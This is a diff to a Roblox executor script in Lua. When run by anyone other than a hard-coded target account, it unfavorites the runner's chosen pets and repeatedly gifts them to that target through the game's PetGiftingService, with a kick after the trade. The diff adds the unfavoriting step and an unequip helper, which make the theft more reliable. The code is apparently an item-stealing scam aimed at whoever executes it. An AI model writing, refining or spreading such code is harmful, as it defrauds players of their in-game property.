@@ -1,6 +1,6 @@
 getgenv().Target = "blade44GONsjp"
 getgenv().Select_Pet = {
-    "Kitsune"
+    "Kitsune",
 }
 getgenv().Kick_After_Trade = true
 repeat task.wait() until game:IsLoaded()
@@ -38,6 +38,14 @@ local function check_pet(name)
     return false
 end
 
+function UnequipAllPets()
+    for i, v in ipairs(plr.Character:GetChildren()) do
+        if v:IsA("Tool") then
+            v.Parent = plr.Backpack
+        end
+    end
+end
+
 local save = {}
 
 if getgenv().Target == plr.Name then
@@ -50,6 +58,9 @@ if getgenv().Target == plr.Name then
 else
     for i, v in pairs(plr:FindFirstChild("Backpack"):GetChildren()) do
         if v:IsA("Tool") and v:GetAttribute("ItemType") == "Pet" and check_pet(v.Name) then
+            if v:GetAttribute("d") == true then
+                game:GetService("ReplicatedStorage"):FindFirstChild("GameEvents"):FindFirstChild("Favorite_Item"):FireServer(v)
+            end
             if not table.find(save, v) then
                 table.insert(save, v)
             end
@@ -57,12 +68,13 @@ else
     end
     while task.wait() do
         for i, v in pairs(save) do
-            if plr:FindFirstChild("Backpack"):FindFirstChild(v.Name) then
+            if v.Parent then
                 local huy = game:GetService("Players"):FindFirstChild(getgenv().Target)
-                if huy then
+                if huy and v then
                     plr.Character.Humanoid:EquipTool(v)
                     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", huy)
                     task.wait(5)
+                    UnequipAllPets()
                 end
             else
                 save[i] = nil
